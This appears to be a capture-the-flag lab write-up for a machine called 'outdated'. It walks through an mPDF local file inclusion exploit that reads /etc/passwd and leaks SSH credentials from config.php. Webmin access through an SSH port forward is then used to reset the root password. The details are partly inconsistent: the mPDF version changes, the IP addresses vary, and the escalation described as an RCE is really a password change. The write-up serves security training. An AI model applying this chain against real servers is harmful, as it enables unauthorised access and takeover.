
# About

This lab demonstrates exploiting a file read vulnerability in mPDF 6.0 to leak sensitive configuration files, such as config.php, containing database credentials. Using these credentials, learners gain SSH access to the server. Privilege escalation is achieved by exploiting a Remote Code Execution (RCE) vulnerability in Webmin 1.996, granting root-level access. This lab highlights chained web application vulnerabilities and leveraging outdated administrative tools for privilege escalation.

## Skills Being Worked On

An mPDF vulnerability in version 6.0 will be exploited to obtain an initial foothold. Privileges will then be escalated by exploiting a vulnerability in an outdated version of Webmin 1.996. This lab focuses on exploiting application vulnerabilities and privilege escalation methods.


## Used Tools 

- Nmap

# Information Gathering 

Nmap Scans:

nmap -sT 192.168.142.232
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-26 20:59 -0400
Nmap scan report for 192.168.142.232
Host is up (0.041s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10000/tcp filtered snet-sensor-mgmt

map -sA 192.168.142.232
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-26 20:59 -0400
Nmap scan report for 192.168.142.232
Host is up (0.055s latency).
Not shown: 999 unfiltered tcp ports (reset)
PORT      STATE    SERVICE
10000/tcp filtered snet-sensor-mgmt

Opening 192.168.181.232 shows an HTML to PDf converter options for text uploads. 

After uploading some test text, "Hello World", a new pdf file marked as "mpdf.pdf" is created with the output on screen. 

Initial research on exploit DB shows that CVE-2022-50897(https://www.sentinelone.com/vulnerability-database/cve-2022-50897/c) can help us exploit mpdf version 7 with local file inclusion.

# Foothold

Testing the mpdf exploit we download the file from exploit DB -> https://www.exploit-db.com/exploits/50995

Using this exploit we were able to create an encrypted payload package that is suitable for the /etc/passwd file. However, upon placing the encrypted payload in the HTML editor, I found that the payload only prints back what was entered. 

After decrypting the payload and only placing in the attachment, "attribute" I was able to get a downloadable attachment with the /etc/passwd file content:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
svc-account:x:1000:1000::/home/svc-account:/bin/bash



From here, we are going to try testing other available files that were found on the "config" and "vendor" sub domain pages

Config path -> /var/www/html/config


Under the file, "config.php" we can find a set of password and usernames that we can test on the target IP using SSH

For example:

$username = "svc-account";
$password = "best&_#Password@2021!!!";


		ssh svc-account@192.168.120.232

With the above login, we are able to successfully login to the "outdated" machine. 

In the home directory we find our first user flag in the local.txt file:

==best&_#Password@2021!!!==


# Privilege Escalation


Now that we have a foothold on the local server, we can escalate our privilege using the Webmin portal. 

After checking the currently available ports, we can see that port 10000 is open. 

Using curl we get short response letting us know that there is an HTML file currently available on this port. 

To view this available file we use a port forward to view this on our localhost:

		ssh -fN -L 10000:localhost:10000 svc-account@192.168.213.232

Now, we can visit, https://localhost:10000 to view the website.

https://localhost:10000 opens to a Webmin account login, which we can access using the credentials we used for the original server login:

$username = "svc-account";
$password = "best&_#Password@2021!!!";

With success, we are able to enter into the Webmin portal!

Upon searching through the portal, it appears we have the ability to change passwords on the available services running, including root. 

To access a root shell, we change the root password to "root" and try an ssh login with the newly created credentials:

$username = "root";
$password = "root

		ssh root@192.168.120.232

Success! We have gotten a root shell and find the final root flag:

root@outdated:/home/svc-account# ls
local.txt
root@outdated:/home/svc-account# cd ..
root@outdated:/home# cd ..
root@outdated:/# cd /root/
root@outdated:~# ls
app  index.html  proof.txt  snap  webmin_1.996_all.deb
root@outdated:~# cat proof.txt 
==278ce5b5ee8d0e51ee1f5b4d52764132==

















